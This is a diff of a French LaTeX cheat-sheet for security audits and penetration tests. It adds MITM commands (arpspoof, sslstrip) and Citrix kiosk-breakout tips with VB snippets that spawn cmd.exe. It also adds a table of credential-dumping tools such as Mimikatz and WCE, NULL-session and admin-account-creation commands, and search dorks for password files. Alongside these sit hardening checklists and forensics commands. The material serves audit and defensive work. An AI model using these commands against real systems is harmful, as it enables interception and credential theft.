@@ -7,10 +7,10 @@
 %					 dans le cadre d'audits de securite, administration
 %					 et tests d'intrusion.
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-\documentclass[a4paper,11pt]{article}				    % entete standard pour feuille de format A4, en police 12pt et en edition en article
-\usepackage[latin1]{inputenc}						    % format d'ecriture en latin1
+\documentclass[a4paper,11pt]{article}				% entete standard pour feuille de format A4, en police 12pt et en edition en article
+\usepackage[latin1]{inputenc}							% format d'ecriture en latin1
 \usepackage[T1]{fontenc}								% format d'encodage de l'ecriture
-\usepackage[francais]{babel}							% conversion des phrases type pour le fran\c cais
+\usepackage[francais]{babel}							% conversion des phrases type pour le francais
 \NoAutoSpaceBeforeFDP 									% supprimer l'espace automatique
 \usepackage{graphicx}									% permet l'ajout\begin{normalsize}
 \usepackage[colorlinks=true,urlcolor=blue]{hyperref}	% permet la gestion des liens colore		
@@ -21,7 +21,7 @@
 \usepackage{pst-all} 									% Pour pstricks
 \usepackage{wasysym} 									% Pour QCM, pour utiliser les commandes $\Square$
 \usepackage{textcomp}
-\usepackage{ifthen} 									% gestion des test :)
+\usepackage{ifthen} 										% gestion des test :)
 \usepackage{color}
 \definecolor{vert}{rgb}{0.3,0.6,0.5}  
 
@@ -78,7 +78,7 @@
 \begin{tabular}{|p{18.4cm}|}
 \hline
 \begin{minipage}[t][4.2cm][t]{18cm}
-
+\vskip-0.2cm
 \subsection{#2} : #5
 \label{#2}
 \begin{description}
@@ -755,7 +755,8 @@ Le r\'esultat est plus important que la taille d'origine : 3octets = 4octets enc
 {
 \url{http://forum.backtrack-fr.net/viewtopic.php?id=2753}\\
 \url{http://arpspoof.sourceforge.net/}\\
-\url{http://www.rtfm.com/ssldump/}
+\url{http://www.rtfm.com/ssldump/}\\
+\url{http://www.thoughtcrime.org/software/sslstrip/sslstrip-0.2.tar.gz}
 }
 {
 	\\ En terme d'analyse les flux chiffr\'es sont assez compliqu\'es \`a exploiter. 
@@ -773,7 +774,7 @@ iptables -A FORWARD -j ACCEPT\\
 \addcontentsline{toc}{subsubsection}{Arpspoof} 
 Spoofing de la machine cible (ip cible et ip de la passerelle) :\\
 {\sl \color{blue}
-arpspoof -t 192.168.0.10 192.168.0.1\\
+arpspoof -i eth0 -t 192.168.0.10 192.168.0.1\\
 }
 
 \addcontentsline{toc}{subsubsection}{Webmitm} 
@@ -786,9 +787,14 @@ webmitm -d\\
 \addcontentsline{toc}{subsubsection}{Ssldump} 
 D\'echiffrement du flux avec ssldump (on lui indique l'emplacement du certificat \`a utiliser) :\\
 {\sl \color{blue}
-	ssldump -n -d -k /usr/share/ettercap/etter.ssl.crt | tee ssldump.log
+	ssldump -n -d -k /usr/share/ettercap/etter.ssl.crt | tee ssldump.log\\
 }
 
+\addcontentsline{toc}{subsubsection}{SSLStrip} 
+D\'echiffrement du flux avec SSLStrip :\\
+{\sl \color{blue}
+	sslstrip.py -l eth0\\
+}
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \fiche{}{Chiffrement/Encodage}{chiffrement.jpg}
@@ -865,6 +871,60 @@ D\'echiffrement du flux avec ssldump (on lui indique l'emplacement du certificat
 	\item Rcracki, utilitaire de cassage utilisant les rainbow tables : \url{http://sourceforge.net/projects/rcracki/}
 	\item Utilitaire d'encodage/d\'ecodage XOR : \url{http://code.google.com/p/xor-encode/source/browse/}
 	\item Rainbow tables : \url{http://www.freerainbowtables.com}
+\end{itemize}
+}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\fiche{}{Citrix}{}
+{
+\url{http://www.citrix.com/English/SS/downloads/index.asp}\\
+\url{http://narkolayev-shlomi.blogspot.fr/2010/02/hacking-citrix-and-terminal-server.html}
+}
+{
+	Système de publication de bureau et d'application \`a distance. Les serveurs sont en environnement Windows.
+}
+{
+\textbf{Points d'attention :}
+\begin{description}
+	\item[$\Square$] Il est toujours possible \`a partir d'une ouverture de fichier ou enregistrement, d'acc\'eder au serveur souche !
+	\item[$\Square$] L'utilisateur ex\'ecutant l'application ne doit pas \^etre l'administrateur.
+	\item[$\Square$] L'ex\'ecution doit \^etre d\'esactiv\'ee pour les utilisateurs.
+	\item[$\Square$] Les disques r\'eseaux doivent \^etre masqu\'es.
+	\item[$\Square$] Les droits sur les disques du serveur ne doivent pas permettre l\'ecriture pour les utilisateurs.
+	\item[$\Square$] Aucun script contenant des mots de passe ne doit \^etre pr\'esent sur le serveur.
+	\item[$\Square$] Le mappage automatique des disques des machines client sur le serveur doit \^etre d\'esactiv\'e.
+	\item[$\Square$] Chaque application publi\'e doit \^etre verrouill\'e aux seuls profils utilis\'es (permet d'\'eviter d'\'enum\'erer et d'ex\'ecuter des applications non pr\'evues mais publier sur Citrix) .
+	\item[$\Square$] Les application syst\`emes du serveur doivent \'etre d\'esactiv\'es : cmd.exe, regedit.exe, telnet.exe, ftp.exe, taskmgr.exe\dots{}
+\end{description}
+\vskip+0.2cm
+\textbf{Exemples de script Visual Basic (macro pour office ou script vbs) :}
+\begin{itemize}
+\item Configuration du serveur :\\ \url{http://community.citrix.com/download/attachments/37388932/pol_enum.zip?version=2}
+\item Activer une application publi\'ee :\\ \url{http://www.thomaskoetzing.de/index.php?option=com_content&task=view&id=132&Itemid=204}
+\end{itemize}
+\vskip+0.2cm
+\textbf{Exemple d'ex\'ecution de commande en VB :}\\
+{\sl \color{blue}Dim shlomi ShellSet shlomiShell= WScript.CreateObject ("WScript.shell") oShell.run "cmd /K CD C:\ \& Dir" Set shlomiShell= Nothing}\\
+Ou\\
+{\sl \color{blue}Set objApp = CreateObject("WScript.Shell") objApp.run "CMD c:$\backslash$"}
+\vskip+0.2cm
+\textbf{Outils Citrix :}
+\begin{itemize}
+\item CtxAdmTools Pack : \url{http://ctxadmtools.musumeci.com.ar/CtxAdmTools/CtxAdmTools_Pack.html}
+\item Outils Regedit, cmd sans GPO : \url{http://blog.gentilkiwi.com/mimikatz/nogpo}
+\item \'Enum\'eration des application publi\'ees\dots{} : \url{http://www.vulnerabilityassessment.co.uk/Citrix.html}
+\end{itemize}
+\vskip+0.2cm
+\textbf{Raccourcis :}
+\begin{itemize}
+\item {\sl \color{blue}Ctrl + o} : Ouvrire un fichier
+\item {\sl \color{blue}Ctrl + s} : Enregistrer un fichier
+\item {\sl \color{blue}Ctrl + n, Ctrl/Maj + gauche, Windows + e} : Ouvrir un explorateur de fichier
+\item {\sl \color{blue}Ctrl + h} : Afficher l'historique
+\item {\sl \color{blue}Ctrl + Maj + Ech} : Gestionnaire de t\^aches
+\item {\sl \color{blue}Windows + r} : Ex\'ecuter une t\^ache
+\item {\sl \color{blue}Windows + f} : Recherche Windows
+\item {\sl \color{blue}F1} : Afficher l'aide
+\item {\sl \color{blue}Ctrl + F10} : Clique droit de la souris
 \end{itemize}
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
@@ -2337,7 +2397,7 @@ Permet de g\'erer des groupes de communications (sur des switches/routeur) pour 
 \textbf{Modifier l'adresse MAC : }\vskip +0.1cm
 \includegraphics[scale=0.7]{Etherchange-02.png}\\
 
-\textit{Sous Windows il est aussi possible de modifier l'adresse MAC en allant dans les propri\'et\'e de la connexion r\'eseau-> bouton \textbf{Configurer} -> onglet \textbf{Avanc\'e}, s\'electionner dans la liste \textbf{propri\'et\'e} : \textbf{Adresse administr\'ee localement}, en bas de la fen\^etre s\'electionner \textbf{Valeur} et indiquer dans la zone de texte l'adresse choisie (exemple : AABBCCDDEEFF).}\\
+\textit{Sous Windows il est aussi possible de modifier l'adresse MAC dans les propri\'et\'e de la connexion r\'eseau-> bouton \textbf{Configurer} -> onglet \textbf{Avanc\'e}, s\'electionner dans la liste \textbf{propri\'et\'e} : \textbf{Adresse administr\'ee localement}, en bas de la fen\^etre s\'electionner \textbf{Valeur} et indiquer dans la zone de texte l'adresse choisie (exemple : AABBCCDDEEFF).}\\
 
 \textit{Sous Windows il est aussi possible de modifier l'adresse MAC directement dans la base de registre~:\\}
 \textbf{ HKEY\_LOCAL\_MACHINE$\backslash$SYSTEM$\backslash$CurrentControlSet$\backslash$Control$\backslash$Class$\backslash$\{4D36E972-E325-11CE-BFC1-08002bE10318\}}
@@ -2770,6 +2830,7 @@ Se base sur les ent\^etes de fichier : \url{http://www.cgsecurity.org/wiki/File_
 }
 {
 \textbf{Sauvegarde d'un disque bit \`a bit : } {\sl \color{blue}dd if=/dev/sdc of=/media/sav/fichier\_resultat.raw}\\
+\textbf{Sauvegarde du MBR d'un disque : } {\sl \color{blue}dd if=/dev/sdc of=/media/sav/mbr.raw bs=512 count=1}\\
 \textbf{Sauvegarde de la m\'emoire RAM : } {\sl \color{blue}dd if=/dev/mem of=/media/sav/fichier\_resultat.raw}\\
 \textbf{Sauvegarde de la liste des processus et \'etat : } {\sl \color{blue}tar cvjf proc.tar.bz2 /proc}\\
 \textbf{Sauvegarde de l'\'etat des services et ports : } 
@@ -2777,26 +2838,26 @@ Se base sur les ent\^etes de fichier : \url{http://www.cgsecurity.org/wiki/File_
 \textbf{Liste des modules charg\'es en m\'emoire : } {\sl \color{blue}df -a}\\
 \textbf{Liste des services et leurs niveaux d'ex\'ecution : } {\sl \color{blue}chkconfig {-}{-}list}\\
 \textbf{\'Etat des services : } {\sl \color{blue}/etc/rc.d/init.d/[Nom du service]}\\
-\textbf{Liste des t\^ aches programm\'ees : } {\sl \color{blue}crontab -l}\\
+\textbf{Liste des t\^ aches programm\'ees : } {\sl \color{blue}crontab -l}\vskip+0.15cm
 
 \textbf{Monter une image RAW en local (ici en lecture seule, en n'autorisant pas l'ex\'ecution) :}\\
 {\sl \color{blue}mount -o loop,ro,noexec imag.raw /media/rep}
 
-\vskip+0.2cm
+\vskip+0.15cm
 \textbf{Recherche des cha\^ines dans une image RAW (exemple SWAP) :} {\sl \color{blue}strings img\_swap.raw}\\
 \textbf{Liste de tous les fichiers par date de modification :} {\sl \color{blue}ls -altR .}
 
-\vskip+0.2cm
+\vskip+0.15cm
 \textbf{Liste des fichiers modifi\'es entre hier et 3 jours avants :} \\
 \textit{(modifi\'es -mtime, acc\'ed\'es : -atime, ou le status \`a chang\'e -ctime)}\\
 {\sl \color{blue}find . -mtime -4 -mtime +3 -type f -exec ls -lcd {} $\backslash$; > resultat.txt}
 
-\vskip+0.2cm
+\vskip+0.15cm
 \textbf{Scanne antivirus avec Clamav :}\\ 
 \textit{Mise \`a jour de la base de signature : {\sl \color{blue}freshclam}}\\
 {\sl \color{blue}clamscan -r -i .}
 
-\vskip+0.2cm
+\vskip+0.15cm
 \textbf{Outils de r\'ecup\'eration de fichiers effac\'es :}
 \begin{itemize}
 	\item testdisk (recherche de partition supprim\'ee) shell-menus.
@@ -2804,16 +2865,15 @@ Se base sur les ent\^etes de fichier : \url{http://www.cgsecurity.org/wiki/File_
 	\item \nameref{Foremost}
 	\item scalpel (d\'ecommenter les types de fichier dans /etc/scalpel/scalpel.conf) : 
 	{\sl \color{blue}scalpel img.raw -o resultats}
-
 \end{itemize}
 
-\vskip+0.2cm
+\vskip+0.15cm
 \textbf{Version d'Apache install\'ee : }\\
 \textit{Derni\`ere version disponible sur \url{http://httpd.apache.org}}\\
 \textit{Pour chrooter un r\'epertoire : {\sl \color{blue}chroot /media/rep}}\\
 {\sl \color{blue}/usr/sbin/httpd -v}
 
-\vskip+0.2cm
+\vskip+0.15cm
 \textbf{Fichiers et r\'epertoires importants :}\\
 \textit{Ces \'el\'ement d\'ependent de la configuration local.}
 \begin{itemize}
@@ -2827,7 +2887,7 @@ Se base sur les ent\^etes de fichier : \url{http://www.cgsecurity.org/wiki/File_
 	\item Scripts de connexion et d\'econnexion des utilisateurs : {\sl \color{blue}\%userhome\%/.bashrc} et {\sl \color{blue}\%userhome\%/.bash\_logout}
 \end{itemize}
 
-\vskip+0.2cm
+\vskip+0.15cm
 \textbf{Commandes utiles :}\\
 Identifier les heures de d\'ebut et de fin d'enregistrement pour chaque jour :\\
 {\sl \color{blue}(cat messages.log | uniq -w 6 \&\& tac messages.log | uniq -w 6) | sort -M > fichier\_resultat.log}\vskip+0.2cm
@@ -2853,7 +2913,6 @@ gconftool-2 -s -t boolean /apps/nautilus/preferences/mmedia\_automount\_open fal
 
 \vskip+0.2cm
 \textbf{Copie du disque dur bit \`a bit :}\\
-\begin{footnotesize} (GUI pour dd/dc3dd : \url{http://www.cryptolife.org/index.php/AIR_-_Automated_Image_and_Restore})\\\end{footnotesize}
 \textit{Une copie bit \`a bit d'un disque permet de copier tous les secteurs d'un disque, l'option \textbf{bs} permet d'optimiser la copie, ici pour un disk-buffer de 4mo  (Pour identifier le disque {\sl \color{blue}fdisk -l}}).\\
 {\sl \color{blue}dd if=/dev/sdc of=/media/Sauvegarde/fichier\_resultat.raw bs=4096}
 
@@ -3010,7 +3069,7 @@ Copier un fichier \`a partir/vers du serveur FTP : {\color{blue}get monbeaufichi
 \url{inurl:passlist.txt | inurl:passwd.txt filetype:txt}\\
 
 \textbf{Recherche de fichiers de configuration CISCO avec un mot de passe r\'eversible :}\\
-\url{"password 7" filetype:txt}\\
+{\color{blue}"password 7" filetype:txt}\\
 
 \begin{LARGE}Outils \& liens : \end{LARGE}
 \begin{itemize}
@@ -3216,7 +3275,9 @@ Connexion en SSH sur le client :\\
     \item[$\Square$] L'acc\`es \`a l'interface d'administration doit \^etre restreint aux seuls postes d'administration.
     \item[$\Square$] Les services inutiles doivent \^etre d\'esactiv\'es : FTP, HTTP, TELNET, SNMP, IPX, NetBIOS\dots{}
     \item[$\Square$] La mise \`a jour de l'IOS de l'imprimante doit \^etre effectu\'ee.
-    \item[$\Square$] Une journalisation \'electronique ou papier (date, heure, machines et noms des fichiers) peut \^etre mise en place (sur certains syst\`emes) en cas de besoin de suivi (habilitations sp\'ecifiques).\\
+    \item[$\Square$] Une journalisation \'electronique ou papier (date, heure, machines et noms des fichiers) peut \^etre mise en place (sur certains syst\`emes) en cas de besoin de suivi (habilitations sp\'ecifiques).
+    \item[$\Square$] La configuration r\'eseau ne doit pa \^etre accessible aux utilisateurs.
+    \item[$\Square$] Un MAC-locking doit \^etre impl\'ement\'e sur la prise r\'eseau de l'imprimante.\\
 \end{description}
 
 \begin{LARGE}Organisation : \end{LARGE}
@@ -3226,6 +3287,9 @@ Connexion en SSH sur le client :\\
     \item[$\Square$] L'impression des documents classifi\'es doit \^etre consign\'ee dans un registre. 
     %\item[$\Square$] L'imprimante doit \^etre marqu\'ee du niveau de classification du r\'eseau.\\
 \end{description}
+
+
+
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \fiche{}{Iptables}{netfilter.png}{\url{http://www.delafond.org/traducmanfr/man/man8/iptables.8.html}\\ \url{http://fr.wikipedia.org/wiki/Iptables}}
@@ -3424,14 +3488,35 @@ ou par incr\'ementation\\
 {
 \begin{LARGE}R\'ecup\'eration du Hash des mots de passe : \end{LARGE}\vskip +0.3cm
 \textbf{Sous Windows : }\vskip +0.1cm
-Il faut utiliser un utilitaire comme \textbf{Pwdump} ou \textbf{Fgdump} pour r\'ecup\'erer le hash des mots de passe en  LM et NTLM :
+Il faut utiliser un utilitaire comme \textbf{Pwdump} ou \textbf{Fgdump} pour r\'ecup\'erer le hash des mots de passe en  LM et NTLM :\\
+
+\addcontentsline{toc}{subsubsection}{Mimikatz}
+\addcontentsline{toc}{subsubsection}{Pwdump6/Fgdump}
+\addcontentsline{toc}{subsubsection}{Pwdump7}
+\addcontentsline{toc}{subsubsection}{Windows Credentials Editor (WCE)}
+\addcontentsline{toc}{subsubsection}{SAMDump2}
+\addcontentsline{toc}{subsubsection}{Bkhive}
+\addcontentsline{toc}{subsubsection}{Ophcrack}
+
+\scriptsize
+\begin{tabular}[t]{p{3cm}|l|p{3cm}|l|l}
+\textbf{Outils} & \textbf{M\'ethode} & \textbf{Type de compte}  & \textbf{OS} 			& \textbf{URL} \\\hline
+Mimikatz 		& Injection DLL 		& AD+local 						& Tous 	& \url{http://www.gentilkiwi.com}\\\rowcolor[gray]{.9}
+Pwdump6/Fgdump & Injection DLL 		& AD+local 						& Tous 	& \url{http://www.foofus.net/fizzgig/}\\
+Pwdump7			& Injection DLL 		& AD+local+CacheDump			& Tous 	& \url{http://www.tarasco.org/security/pwdump_7/}\\\rowcolor[gray]{.9}
+WCE 				& M\'emoire				& Kerberos+CacheDump +actuel & Tous & \url{http://www.ampliasecurity.com/research.html}\\
+SAMDump2/Bkhive Ophcrack& Registre				& local							& XP,2003,Vista			& \url{http://sourceforge.net/projects/ophcrack/}\\\rowcolor[gray]{.9}
+ntds\_dump\_hash ntdsxtract& NTDIS.DIT			& AD+CacheDump					& 2003,2008					& \url{http://www.ntdsxtract.com/}\\
+\end{tabular}
+\vskip +0.5cm
+\normalsize
+\addcontentsline{toc}{subsubsection}{ntds\_dump\_hash}
+\addcontentsline{toc}{subsubsection}{ntdsxtract}
+\addcontentsline{toc}{subsubsection}{vssown}
+Ressources compl\'ementaires pour \textbf{ntds\_dump\_hash \& ntdsxtract} :\\
 \begin{itemize}
-	\item Mimikatz : \url{http://www.gentilkiwi.com}
-	\item Pwdump/Fgdump : \url{http://www.foofus.net/fizzgig/}
-	\item WCE : \url{http://www.ampliasecurity.com/research.html} (\url{http://www.ampliasecurity.com/research/wce_v1_2.tgz})
-	\item RtCA : \url{http://code.google.com/p/omnia-projetcs/}
-	\item SAMDUMP2/Bkhive et Ophcrack : \url{http://sourceforge.net/projects/ophcrack/files/}
-	\item ntds\_dump\_hash + script shadow copy : \url{http://csababarta.com/downloads/ntds_dump_hash.zip}, \url{http://tools.lanmaster53.com/vssown.vbs} et les ressources : \url{http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html}
+\item Script de shadow copy : \url{http://tools.lanmaster53.com/vssown.vbs}
+\item Ressources : \url{http://pauldotcom.com/2011/12/safely-dumping-hashes-now-avai.html}\\ \url{http://pauldotcom.com/2011/11/safely-dumping-hashes-from-liv.html}
 \end{itemize}
 \vskip +0.5cm
 
@@ -4120,9 +4205,8 @@ Les termes de recherche pour les exploits : \textbf{Breaking chroot()}\\
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 \fiche{}{Linux - GRUB}{gnu_grub.jpg}
 {
-\url{http://grub.enbug.org}\\
-\url{http://grub.enbug.org/GRUB2LiveCDInstallGuide-FR}\\
-\url{http://www.dedoimedo.com/computers/grub-2.html}\\
+\url{http://grub.enbug.org}, \url{http://grub.enbug.org/GRUB2LiveCDInstallGuide-FR}\\
+\url{http://www.dedoimedo.com/computers/grub-2.html}\\ \url{http://doc.ubuntu-fr.org/tutoriel/comment_restaurer_grub}
 }{
 \\GNU GRUB est un gestionnaire de d\'emarrage. C'est une version am\'elior\'ee de GRUB the GRand Unified Bootloader.\vskip+0.1cm
 
@@ -4151,12 +4235,11 @@ Exemple pour modifier une entr\'ee pour d\'emarrer en single-user :
 \begin{itemize}
 	\item Ex\'ecuter le shell grub : {\sl \color{blue}grub}
 	\item Cr\'eer un mot de passe en MD5 dans le shell grub avec la commande : {\sl \color{blue}md5crypt}
-	\item \'Editer le fichier {\sl \color{blue}/boot/grub/menu.lst}
-	\item En d\'ebut de fichier (apr\`es les premi\`eres lignes {\sl \color{blue}default}, {\sl \color{blue}timeout} et {\sl \color{blue}hiddenmenu}) ajouter la ligne :\\ {\sl \color{blue}password {-}{-}md5 \textit{MonHashMD5AvecMd5crypt}}
+	\item \'Editer le fichier {\sl \color{blue}/boot/grub/menu.lst}, en d\'ebut de fichier (apr\`es les premi\`eres lignes {\sl \color{blue}default}, {\sl \color{blue}timeout} et {\sl \color{blue}hiddenmenu}) ajouter la ligne : {\sl \color{blue}password {-}{-}md5 \textit{MonHashMD5AvecMd5crypt}}
 \end{itemize}
 
 \vskip+0.1cm
-\textbf{Restreindre certaine entr\'ees du menu par un mot de passe :}\\
+\textbf{Restreindre certaines entr\'ees du menu par un mot de passe :}\\
 \textit{Pour \'eviter par exemple l'utilisation du mode single-user.}
 \begin{itemize}
 	\item il faut cr\'eer un hash de notre mot de passe en MD5 (dans un shell grub, avec la commande {\sl \color{blue}md5crypt}) ;
@@ -4175,13 +4258,12 @@ Exemple pour modifier une entr\'ee pour d\'emarrer en single-user :
 \vskip+0.1cm
 \textbf{D\'esactiver les options interactives (fichier {\sl \color{blue}/etc/grub.d/00\_header}) :}
 \begin{itemize}
-	\item \`A la fin du fichier d\'eclarer un compte super utilisateur (ici admin et toto) et lui affecter un mots de passe :
+	\item Cr\'eer un compte super utilisateur (ici admin et toto) et lui affecter un mots de passe, le hash est cr\'e\'e avec {\sl \color{blue}grub-mkpasswd\_pbkdf2} :\\
 	{\sl \color{blue}cat {<}{<} EOF}\\
 	{\sl \color{blue}set superusers="admin,toto"}\\
-	{\sl \color{blue}password admin MonB0mdpa\$\$}\\
+	{\sl \color{blue}password\_pbkdf admin <hash du mot de passe>}\\
 	{\sl \color{blue}EOF}
 \end{itemize}
-
 %\vskip+0.1cm
 \textbf{Restreindre certaine entr\'ees du menu par un mot de passe :}
 \begin{itemize}
@@ -4202,7 +4284,7 @@ Exemple pour modifier une entr\'ee pour d\'emarrer en single-user :
 	\item Monter la partition et les p\'eriph\'eriques : {\sl \color{blue}mount -t ext3 /dev/hda1 /mnt/disk} et {\sl \color{blue}mount {-}{-}bind /dev/ /mnt/dev}
 	
 	\item Entrer dans le point de montage et le chrooter : 	{\sl \color{blue}cd /mnt/disk/} puis {\sl \color{blue}chroot /mnt/disk}
-	\item installer grub : {\sl \color{blue}grub-install /dev/hda1}
+	\item Installer grub : {\sl \color{blue}grub-install /dev/hda1}
 	\item Quitter le chroot et d\'emonter : {\sl \color{blue}CTRL+D}, {\sl \color{blue}umount /mnt/dev} et {\sl \color{blue}umount /mnt/disk}
 \end{itemize}
 }
@@ -5995,8 +6077,7 @@ Linux : {\sl \color{blue}smbclient -L 192.168.0.1}\vskip + 0.2cm
 \textit{Si la commande se termine normalement, une NULL session est possible (sans login ni mot de passe).}\\
 Pour que les sessions nulles soient possibles il faut que les cl\'es DWORD du registre suivantes soient \`a 0 :\\
 {\sl \color{blue}
-HKEY\_LOCAL\_MACHINE$\backslash$SYSTEM$\backslash$CurrentControlSet$\backslash$Control$\backslash$Lsa$\backslash$restrictanonymous, restrictanonymoussam, lmcompatibilitylevel\\
-}
+HKEY\_LOCAL\_MACHINE$\backslash$SYSTEM$\backslash$CurrentControlSet$\backslash$Control$\backslash$Lsa$\backslash$restrictanonymous, restrictanonymoussam, lmcompatibilitylevel}\vskip+0.15cm
 \textbf{Test de NULL session : }\\
 Windows : {\sl \color{blue}net use $\backslash$$\backslash$192.168.0.1$\backslash$ipc\$ /USER:"" ""}\vskip + 0.2cm 
 \textbf{Voir la liste des partages : }\\
@@ -6005,21 +6086,21 @@ Windows : {\sl \color{blue}net view $\backslash$$\backslash$192.168.0.1}\vskip +
 Windows : {\sl \color{blue}net user NomUtilisateur MotDePasse /add}\\
 Windows : {\sl \color{blue}net localgroup Administrateurs NomUtilisateur /add}\\
 ou {\sl \color{blue}net group Administrateurs NomUtilisateur /add}
-\vskip + 0.2cm 
+\vskip+0.15cm
 Attention sous Windows, pour ces commandes cygwin*.dll doit se trouver dans le m\^eme r\'epertoire.\\ \url{http://www.securityforest.com/downloads/Enum+.zip}\vskip +0.2cm
 \textbf{\'Enum\'eration des utilisateurs et groupes locaux (\textit{-U} ou \textit{-G}) : }\addcontentsline{toc}{subsubsection}{Enum} \\
-{\sl \color{blue}enum -U 192.168.0.1}\vskip + 0.2cm 
+{\sl \color{blue}enum -U 192.168.0.1}\vskip+0.15cm
 \textbf{Politique de s\'ecurit\'e des comptes (local : \textit{-P} ou LSA : \textit{-L}) : }\\
-{\sl \color{blue}enum -P 192.168.0.1}\vskip + 0.2cm
+{\sl \color{blue}enum -P 192.168.0.1}\vskip+0.15cm
 \textbf{Liste des ports NetBIOS ouverts : }\addcontentsline{toc}{subsubsection}{Smbserverscan} \\
-{\sl \color{blue}smbserverscan 192.168.0.1}\vskip + 0.2cm
+{\sl \color{blue}smbserverscan 192.168.0.1}\vskip+0.15cm
 \textbf{Liste des partages, groupes, utilisateurs, politiques de s\'ecurit\'e : }\addcontentsline{toc}{subsubsection}{Userinfo-ng} \\
-{\sl \color{blue}userinfo-ng 192.168.0.1}\vskip + 0.2cm
+{\sl \color{blue}userinfo-ng 192.168.0.1}\vskip+0.15cm
 \textbf{Tests de s\'ecurit\'e avec tests de cassage de mdp :}\addcontentsline{toc}{subsubsection}{smb-nat} \\
-{\sl \color{blue}smb-nat 192.168.0.1 -o resultat.txt -u dico\_user.txt -p dico\_mdp.txt}\vskip + 0.2cm
+{\sl \color{blue}smb-nat 192.168.0.1 -o resultat.txt -u dico\_user.txt -p dico\_mdp.txt}\vskip+0.15cm
 
 \textit{L'outil SuperScan permet aussi d'effectuer tous ces tests de mani\`ere automatique.}\\
-\url{http://www.foundstone.com/us/resources/proddesc/superscan.htm}\vskip + 0.2cm
+\url{http://www.foundstone.com/us/resources/proddesc/superscan.htm}\vskip+0.15cm
 \textit{LUS permet d'effectuer un reverse SID, une \'enum\'eration NetBIOS, RPC\dots{}} \url{http://omni.a.free.fr}
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
@@ -6056,7 +6137,7 @@ L'option -s permet de sp\'ecifier l'interface r\'eseau \`a utiliser.\\
 {\sl \color{blue}nc 192.168.0.1 777 < fichier.txt}\vskip + 0.2cm
 
 \textbf{Proxy transparent : }\\
-\textit{Les requ\^etes \'emises sont sotcku\'ees dans \textbf{in\_file} et les r\'eponses dans \textbf{out\_file}.}\\
+\textit{Les requ\^etes \'emises sont stock\'ees dans \textbf{in\_file} et les r\'eponses dans \textbf{out\_file}.}\\
 {\sl \color{blue}
 mknod backpipe p\\
 nc -l -p 80 < backpipe | tee -a in\_file | nc localhost 8080 | tee -a out\_file > backpipe
@@ -6399,7 +6480,7 @@ Un serveur Oracle peut contenir plusieurs bases de donn\'ees, avec ses propres c
 	\item[.dbf] la base de donn\'ee ; \textbf{.rdo} et \textbf{.log} historique des modifications effectu\'es effectu\'ees sur la base ;
 	\item[.ctl] emplacement des fichiers et \'etat de la base.
 \end{description}
-\vskip + 0.4cm
+\vskip + 0.2cm
 \begin{LARGE}Points \`a v\'erifier : \end{LARGE}
 \begin{description}
     \item[$\Square$] La pr\'esence d'un minimum de modules (supprimer le serveur HTTP Oracle si inutile\dots{}).
@@ -6413,7 +6494,7 @@ Un serveur Oracle peut contenir plusieurs bases de donn\'ees, avec ses propres c
     \item[$\Square$] Penser \`a r\'ecup\'erer tous les fichiers \textbf{*.ora} et les analyser avec l'outil \textbf{lsnrcheck}.
 \end{description}
 {\small
-\vskip + 0.4cm
+\vskip + 0.2cm
 \begin{LARGE}Exemples de comptes par d\'efaut : \end{LARGE}\\
 \begin{tabular}{|l|l|l|}
 \hline \textbf{Comptes} & \textbf{Mot de passe par d\'efaut} & \textbf{Privil\`eges}\\
@@ -6432,7 +6513,7 @@ TRACESVR & TRACE & Compte privil\'egi\'e\\
 DBSNMP & DBSNMP & Compte de test (doit \^etre supprim\'e)\\
 \hline
 \end{tabular}}
-\vskip + 0.4cm
+\vskip + 0.2cm
 \begin{LARGE}Outils et liens : \end{LARGE}\vskip +0.1cm
 \textit{Client Oracle : SQL*Plus Instant Client.}\\
 \url{http://www.oracle.com/technology/tech/sql_plus/index.html}\vskip +0.1cm
@@ -6596,6 +6677,46 @@ Fin du document\\
 \end{tabular}
 }
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\fiche{}{PDF - Outils}{PDF.png}
+{\O}
+{
+\\Exploitation, analyse du format PDF \& malware.
+}
+{
+\textbf{peepdf}\addcontentsline{toc}{subsubsection}{peepdf}\\
+\textit{Analyse de la strcuture de fichier PDF, la commande (-i) interactive permet une exploitation direct plus fine.}\\
+\url{http://eternal-todo.com/tools/peepdf-pdf-analysis-tool}\\
+Extraction en ignorant les erreurs : {\sl \color{blue}./peedpdf.py -f <fichier.pdf>}\vskip+0.2cm
+
+\textbf{pdfextrtact}\addcontentsline{toc}{subsubsection}{pdfextrtact}\\
+\textit{Du frameworks Origami codé en tuby, extraction d'objets d'un PDF (image, texte, scripts, polices) :}\\
+\url{http://code.google.com/p/origami-pdf/}\\
+{\sl \color{blue}pdfextract <fichier.pdf>}\vskip+0.2cm
+
+\textbf{DiffPDF}\addcontentsline{toc}{subsubsection}{DiffPDF}\\
+\textit{Comparaison de plusieurs fichiers PDF.}
+\url{http://www.qtrac.eu/diffpdf.html}\vskip+0.2cm
+
+\textbf{PDF Stream Dumper}\addcontentsline{toc}{subsubsection}{PDF Stream Dumper}\\
+\textit{Analyse de fichier et identification de malware.}\\
+\url{http://sandsprite.com/blogs/index.php?uid=7&pid=57}\vskip+0.2cm
+
+\textbf{Documentation}
+\begin{itemize}
+\item Analyzing PDF malware\\ \url{http://blog.spiderlabs.com}
